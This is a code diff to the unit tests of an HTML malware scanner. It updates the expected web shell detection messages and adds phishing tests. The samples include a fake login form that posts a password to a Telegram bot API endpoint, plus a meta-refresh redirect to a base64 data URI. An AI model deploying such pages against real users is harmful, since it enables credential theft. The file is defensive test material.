@@ -52,6 +52,10 @@ TEST(ScanTest, Worm)
 
 }
 */
+
+/***********************************
+************* BackDoor *************
+************************************/
 TEST(ScanTest, BackDoor_Normal)
 {
     CHtmlParser parser;
@@ -99,8 +103,7 @@ TEST(ScanTest, BackDoor_C99)
 
     EXPECT_TRUE(analyzer.isBackDoor());
     std::string report = analyzer.getDetectionReport();
-    EXPECT_NE(report.find("[BackDoor]"), std::string::npos);
-    EXPECT_NE(report.find("C99 Shell"), std::string::npos);
+    EXPECT_NE(report.find("[H901] C99 Shell Command Input Detected"), std::string::npos);
 }
 
 TEST(ScanTest, BackDoor_ByroeNet)
@@ -123,5 +126,49 @@ TEST(ScanTest, BackDoor_ByroeNet)
 
     EXPECT_TRUE(analyzer.isBackDoor());
     std::string report = analyzer.getDetectionReport();
-    EXPECT_NE(report.find("ByroeNet"), std::string::npos);
+    EXPECT_NE(report.find("[H902] ByroeNet Web Shell Detected"), std::string::npos);
+}
+
+/***********************************
+************* Phishing *************
+************************************/
+
+TEST(ScanTest, ApiAbuse)
+{
+    CHtmlParser parser;
+    CHtmlAnalyzer analyzer;
+    parser.SetHandler(&analyzer);
+    std::string maliciousHtml = // made by Gemini
+        "<html><body>"
+        "<form action=\"https://api.telegram.org/bot123456:ABC-DEF/sendMessage\" method=\"POST\">"
+        "   <h3>Login to verify</h3>"
+        "   <input type=\"password\" name=\"pw\">"
+        "   <input type=\"submit\" value=\"Login\">"
+        "</form>"
+        "</body></html>";
+
+	parser.Parse(maliciousHtml.c_str(), maliciousHtml.length());
+
+    EXPECT_TRUE(analyzer.isPhishingPattern());
+    std::string report = analyzer.getDetectionReport();
+
+    EXPECT_NE(report.find("[H101] Phishing API Abuse Detected"), std::string::npos);
+}
+
+TEST(ScanTest, EvasionMetaDataURI)
+{
+    CHtmlParser parser;
+    CHtmlAnalyzer analyzer;
+    parser.SetHandler(&analyzer);
+
+    std::string maliciousHtml = // made by Gemini
+        "<html><head>"
+        "<meta http-equiv=\"refresh\" content=\"0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">"
+        "</head><body></body></html>";
+
+    parser.Parse(maliciousHtml.c_str(), maliciousHtml.length());
+
+    EXPECT_TRUE(analyzer.isPhishingPattern());
+    std::string report = analyzer.getDetectionReport();
+    EXPECT_NE(report.find("[H102] Meta Refresh Data URI Detected"), std::string::npos);
 }
